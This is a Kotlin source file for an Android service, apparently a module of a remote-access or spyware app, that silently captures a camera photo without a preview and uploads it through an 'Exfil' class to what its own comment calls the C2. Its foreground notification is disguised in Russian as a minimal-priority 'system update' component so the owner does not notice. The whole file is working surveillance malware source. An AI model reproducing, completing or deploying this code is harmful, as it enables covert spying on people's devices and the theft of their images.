package com.sp.core.services

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.view.Surface
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.sp.core.c2.Exfil
import java.io.File

/**
 * One-shot camera capture (Camera2): no preview surface, frame is grabbed
 * straight into memory, JPEG is encrypted and pushed to the C2.
 */
class CameraSnapService : Service() {

    private val handler = Handler(Looper.getMainLooper())
    private var cameraDevice: CameraDevice? = null
    private var imageReader: ImageReader? = null
    private var session: CameraCaptureSession? = null

    override fun onCreate() {
        super.onCreate()
        try {
            startForeground(NOTIF_ID, buildNotification())
        } catch (t: Throwable) {
            // Android 12+ refuses foreground services without the matching
            // permission or from a background start - never kill the process.
            stopSelf()
            return
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val front = intent?.getBooleanExtra(EXTRA_FRONT, false) ?: false
        snap(front)
        return START_NOT_STICKY
    }

    private fun snap(front: Boolean) {
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
                Exfil.sendLog(this, "camera", """{"error":"no_camera_permission"}""")
                stopSelf()
                return
            }
            val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = pickCamera(manager, front) ?: run {
                Exfil.sendLog(this, "camera", """{"error":"no_camera"}""")
                stopSelf()
                return
            }
            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    createSession(camera)
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    stopSelf()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    stopSelf()
                }
            }, handler)
        } catch (t: Throwable) {
            Exfil.sendLog(this, "camera", """{"error":"${t.javaClass.simpleName}"}""")
            stopSelf()
        }
    }

    private fun pickCamera(manager: CameraManager, front: Boolean): String? {
        for (id in manager.cameraIdList) {
            val chars = manager.getCameraCharacteristics(id)
            val facing = chars.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING)
            val wanted = if (front)
                android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
            else
                android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK
            if (facing == wanted) return id
        }
        return manager.cameraIdList.firstOrNull()
    }

    private fun createSession(camera: CameraDevice) {
        try {
            val reader = ImageReader.newInstance(WIDTH, HEIGHT, ImageFormat.JPEG, 2)
            imageReader = reader
            reader.setOnImageAvailableListener({ source ->
                val image = source.acquireNextImage()
                if (image == null) return@setOnImageAvailableListener
                try {
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    val file = File(cacheDir, "cam_${System.currentTimeMillis()}.jpg")
                    file.writeBytes(bytes)
                    Exfil.uploadFile(this, file, "photo")
                } catch (_: Throwable) {
                } finally {
                    try { image.close() } catch (_: Throwable) {}
                    closeCamera()
                    stopSelf()
                }
            }, handler)

            camera.createCaptureSession(
                listOf(reader.surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(captureSession: CameraCaptureSession) {
                        session = captureSession
                        try {
                            val builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                            builder.addTarget(reader.surface)
                            builder.set(
                                CaptureRequest.CONTROL_AF_MODE,
                                CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE
                            )
                            builder.set(CaptureRequest.JPEG_ORIENTATION, orientation())
                            captureSession.capture(builder.build(), null, handler)
                        } catch (_: Throwable) {
                            closeCamera()
                            stopSelf()
                        }
                    }

                    override fun onConfigureFailed(captureSession: CameraCaptureSession) {
                        closeCamera()
                        stopSelf()
                    }
                },
                handler
            )
        } catch (_: Throwable) {
            closeCamera()
            stopSelf()
        }
    }

    private fun orientation(): Int {
        val r = getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
        val rotation = if (Build.VERSION.SDK_INT >= 30) {
            r.defaultDisplay?.rotation ?: 0
        } else {
            @Suppress("DEPRECATION")
            r.defaultDisplay.rotation
        }
        return when (rotation) {
            Surface.ROTATION_90 -> 90
            Surface.ROTATION_180 -> 180
            Surface.ROTATION_270 -> 270
            else -> 0
        }
    }

    private fun closeCamera() {
        try { session?.close() } catch (_: Throwable) {}
        try { cameraDevice?.close() } catch (_: Throwable) {}
        try { imageReader?.close() } catch (_: Throwable) {}
        session = null
        cameraDevice = null
        imageReader = null
    }

    override fun onDestroy() {
        closeCamera()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun buildNotification(): Notification {
        val chId = "sys_update"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(chId, "Обновление системы",
                NotificationManager.IMPORTANCE_MIN).apply { setShowBadge(false) }
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
        return NotificationCompat.Builder(this, chId)
            .setContentTitle("android_UI")
            .setContentText("Системный компонент работает")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
    }

    companion object {
        private const val NOTIF_ID = 0x5F65
        private const val WIDTH = 1280
        private const val HEIGHT = 720
        const val EXTRA_FRONT = "front"

        fun start(ctx: Context, front: Boolean = false) {
            val i = Intent(ctx, CameraSnapService::class.java)
                .putExtra(EXTRA_FRONT, front)
            if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i) else ctx.startService(i)
        }
    }
}
